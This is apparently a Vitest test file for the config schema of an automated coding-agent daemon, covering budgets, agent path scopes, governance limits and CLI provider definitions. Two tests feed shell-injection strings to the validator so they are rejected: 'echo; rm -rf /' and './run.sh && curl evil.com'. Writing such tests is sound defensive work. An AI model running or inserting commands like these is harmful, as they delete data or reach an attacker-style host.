import { describe, it, expect } from 'vitest';
import { z } from 'zod';
import { loadConfig, ConfigSchema } from './config.js';
import { mkdtemp, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';

const validConfig = {
  repo: { owner: 'test-owner', name: 'test-repo' },
  controlPort: 3847,
  pollIntervalMs: 30000,
  maxConcurrentRuns: 1,
  dailyBudget: 50,
  perRunBudget: 10,
  adapter: 'cli' as const,
  branches: { staging: 'staging', production: 'main' },
  webhooks: [],
  validation: {
    gate1Commands: ['vitest run', 'tsc --noEmit'],
    maxFixCycles: 3,
  },
};

describe('ConfigSchema', () => {
  it('validates a complete config', () => {
    const result = ConfigSchema.safeParse(validConfig);
    expect(result.success).toBe(true);
  });

  it('accepts config without repo (DB-mode)', () => {
    const { repo, ...rest } = validConfig;
    const result = ConfigSchema.safeParse(rest);
    expect(result.success).toBe(true);
  });

  it('applies defaults for optional fields', () => {
    const result = ConfigSchema.safeParse(validConfig);
    if (result.success) {
      expect(result.data.pollIntervalMs).toBe(30000);
      expect(result.data.classifierBatchSize).toBe(10);
      expect(result.data.governance).toEqual({
        documentPath: 'FACTORY_RULES.md',
        maxPrLinesChanged: 2000,
      });
      expect(result.data.agentScopes).toEqual({});
    }
  });

  it('accepts directory scope overrides per agent type', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      agentScopes: {
        worker: {
          readPaths: ['src/**'],
          writePaths: ['src/generated/**'],
          denyPaths: ['src/generated/private/**'],
        },
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.agentScopes.worker?.writePaths).toEqual([
        'src/generated/**',
      ]);
    }
  });

  it('accepts governance guardrail overrides', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      governance: {
        documentPath: '.auto-claude/FACTORY_RULES.md',
        maxPrLinesChanged: 750,
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.governance.maxPrLinesChanged).toBe(750);
    }
  });

  it('accepts classifier batch size override', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      classifierBatchSize: 25,
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.classifierBatchSize).toBe(25);
    }
  });

  it('accepts multi-provider session runtime config (#480)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers: {
        defaultProvider: 'claude-default',
        fallbackChain: ['codex-planner'],
        definitions: {
          'claude-default': {
            name: 'claude-default',
            adapterClass: 'process-based',
            providerKind: 'claude-cli',
            supportedModelTiers: [
              'standard-capability',
              'higher-capability',
            ],
            cliTool: 'claude',
          },
          'codex-planner': {
            name: 'codex-planner',
            adapterClass: 'process-based',
            providerKind: 'codex-cli',
            supportedModelTiers: ['higher-capability'],
            cliTool: 'codex',
            model: 'gpt-5.5',
            executionFlags: ['exec'],
            required: false,
          },
        },
      },
    });

    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.providers?.defaultProvider).toBe('claude-default');
      expect(result.data.providers?.definitions['codex-planner']?.model).toBe(
        'gpt-5.5',
      );
    }
  });

  it('rejects provider fallback entries that are not registered (#480)', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      providers: {
        defaultProvider: 'claude-default',
        fallbackChain: ['missing-provider'],
        definitions: {
          'claude-default': {
            name: 'claude-default',
            adapterClass: 'process-based',
            providerKind: 'claude-cli',
            supportedModelTiers: ['standard-capability'],
          },
        },
      },
    });

    expect(result.success).toBe(false);
  });

  it('rejects invalid classifier batch size', () => {
    expect(
      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 0 })
        .success,
    ).toBe(false);
    expect(
      ConfigSchema.safeParse({ ...validConfig, classifierBatchSize: 101 })
        .success,
    ).toBe(false);
  });

  it('accepts IPv4 controlHost values (#248)', () => {
    expect(
      ConfigSchema.safeParse({ ...validConfig, controlHost: '127.0.0.1' })
        .success,
    ).toBe(true);
    expect(
      ConfigSchema.safeParse({ ...validConfig, controlHost: '0.0.0.0' })
        .success,
    ).toBe(true);
  });

  it('rejects hostname controlHost values (#248)', () => {
    for (const controlHost of [
      'localhost',
      'my-server.local',
      'example.com',
      '::1',
    ]) {
      const result = ConfigSchema.safeParse({ ...validConfig, controlHost });

      expect(result.success).toBe(false);
    }
  });

  it('rejects invalid adapter', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      adapter: 'invalid',
    });
    expect(result.success).toBe(false);
  });

  it('rejects gate1Commands with shell injection characters', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        gate1Commands: ['echo; rm -rf /'],
      },
    });
    expect(result.success).toBe(false);
  });

  it('rejects holdoutCommand with shell injection characters', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        holdoutCommand: './run.sh && curl evil.com',
      },
    });
    expect(result.success).toBe(false);
  });

  it('accepts safe gate1Commands and holdoutCommand', () => {
    const result = ConfigSchema.safeParse({
      ...validConfig,
      validation: {
        ...validConfig.validation,
        gate1Commands: ['vitest run', 'tsc --noEmit'],
        holdoutCommand: './run-holdout.sh',
      },
    });
    expect(result.success).toBe(true);
  });
});

describe('zod v4 compatibility', () => {
  it('uses zod v4 (major version alignment with dashboard)', () => {
    // Regression: daemon used zod v3 while dashboard used v4 (#113)
    // z.toJSONSchema is a v4-only API — its existence proves we run v4
    expect(typeof z.toJSONSchema).toBe('function');
  });

  it('ConfigSchema produces valid JSON schema via z.toJSONSchema', () => {
    const jsonSchema = z.toJSONSchema(ConfigSchema);
    expect(jsonSchema).toHaveProperty('type', 'object');
    expect(jsonSchema).toHaveProperty('properties');
  });

  it('applies nested defaults when outer object is omitted', () => {
    // Regression: zod v4 requires explicit default values for .default()
    const result = ConfigSchema.safeParse({
      dailyBudget: 50,
      perRunBudget: 10,
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.branches).toEqual({
        staging: 'staging',
        production: 'main',
      });
      expect(result.data.validation.maxFixCycles).toBe(3);
      expect(result.data.diagnosis.confidenceThreshold).toBe(0.7);
      expect(result.data.warmup.threshold).toBe(10);
      expect(result.data.governance.documentPath).toBe('FACTORY_RULES.md');
      expect(result.data.agentScopes).toEqual({});
    }
  });
});

describe('loadConfig', () => {
  it('loads and validates a config file', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'config-'));
    const path = join(dir, 'config.json');
    await writeFile(path, JSON.stringify(validConfig));
    const result = await loadConfig(path);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.repo?.owner).toBe('test-owner');
      expect(result.value.controlPort).toBe(3847);
    }
  });

  it('returns err for missing file', async () => {
    const result = await loadConfig('/tmp/nonexistent-config.json');
    expect(result.ok).toBe(false);
  });

  it('returns err for invalid config', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'config-'));
    const path = join(dir, 'config.json');
    await writeFile(path, JSON.stringify({ adapter: 'invalid' }));
    const result = await loadConfig(path);
    expect(result.ok).toBe(false);
  });
});
